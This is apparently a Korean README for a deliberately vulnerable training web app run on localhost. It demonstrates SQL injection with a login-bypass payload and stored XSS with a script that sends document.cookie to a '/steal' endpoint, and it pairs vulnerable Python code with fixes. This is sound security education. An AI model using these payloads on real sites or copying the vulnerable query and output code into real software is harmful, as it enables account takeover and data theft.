# 🔐 웹 취약점 학습 및 실습 플랫폼

일부러 취약하게 설계한 가상 웹사이트 환경에서  
SQL Injection, XSS 공격 등을 직접 체험하는 보안 교육 플랫폼입니다.

> ⚠️ 이 프로젝트는 교육 목적으로만 제작되었습니다.  


---

## 실행 방법
```bash
git clone 
cd vulnerable_site
docker-compose up -d --build
```

| 페이지 | 주소 | 실습 내용 |
|--------|------|-----------|
| 로그인 | http://localhost:5001/login | SQL Injection |
| 게시판 | http://localhost:5001/board | XSS |

---

## SQL Injection

### 취약한 이유

입력값을 검증 없이 SQL 쿼리에 직접 삽입하기 때문입니다.
```python
# 취약한 코드
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

### 공격 방법

`http://localhost:5001/login` 접속 후

| 입력 항목 | 입력값 |
|----------|--------|
| 아이디 | `' OR '1'='1' --` |
| 비밀번호 | 아무거나 |

### 공격 원리
```sql
-- 정상 쿼리
SELECT * FROM users WHERE username='hong' AND password='1234'

공격 후 실행되는 쿼리
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
-- '1'='1' 은 항상 참 → 전체 회원 정보 반환
```

### 공격 결과
```json
{
  "status": "success",
  "leaked_data": [
    {"username": "관리자", "phone": "010-1234-5678", "email": "admin@shop.com"},
    {"username": "하태훈", "phone": "010-5876-5432", "email": "taehoon@gmail.com"},
    {"username": "김철수", "phone": "010-1111-2222", "email": "kim@wuk.ac.kr"}
  ]
}
```

> 비밀번호 없이 전체 회원 정보가 유출됩니다.

### 방어 방법
```python
# 파라미터 바인딩 사용
query = "SELECT * FROM users WHERE username=? AND password=?"
db.execute(query, (username, password))
```

---

## XSS (Cross-Site Scripting)

### 취약한 이유

사용자 입력값을 HTML 이스케이프 처리 없이 그대로 출력하기 때문입니다.
```python
# 취약한 코드 (출력 시 이스케이프 없음)
posts_html = ''.join([f"<div>{p[1]}</div>" for p in posts])
return Response(posts_html, mimetype='text/html')
```

### 공격 방법

`http://localhost:5001/board` 접속 후

| 입력 항목 | 입력값 |
|----------|--------|
| 이름 | 해커 |
| 내용 | `<script>fetch('http://localhost:5001/steal?cookie=' + encodeURIComponent(document.cookie))</script>` |


### 공격 원리
```
1.script 태그<> - 브라우저에게 글이 아닌 코드로 인식하고 실행하게하는 태그
2.document.cookie - 현재 브라우저에 저장된 쿠키 값을 가져옴
3.encodeURIComponent - 쿠키 값을 url로 전송 가능한 형태로 변환
4.fetch - 쿠키 값을 해커 서버('/steal')로 몰래 전송  
피해자가 모르게 백그라운드에서 실행

공격자가 게시판에 악성 스크립트 작성
        ↓
DB에 스크립트 그대로 저장
        ↓
피해자가 로그인 후(쿠키생성) 게시판 접속
        ↓
브라우저가 스크립트 자동 실행
        ↓
쿠키 탈취 → http://localhost:5001/stolen 에서 확인
```

### 공격 결과

- `http://localhost:5001/stolen` 에서 탈취된 쿠키 확인 가능
```
session_id=abc123xyz_피해자세션
user=관리자
```

> 탈취한 쿠키로 피해자인 척 로그인 가능합니다.

### 방어 방법
```python
# HTML 이스케이프 처리
from markupsafe import escape
content = escape(user_input)
# <script> → &lt;script&gt; 로 변환
# 브라우저가 텍스트로만 인식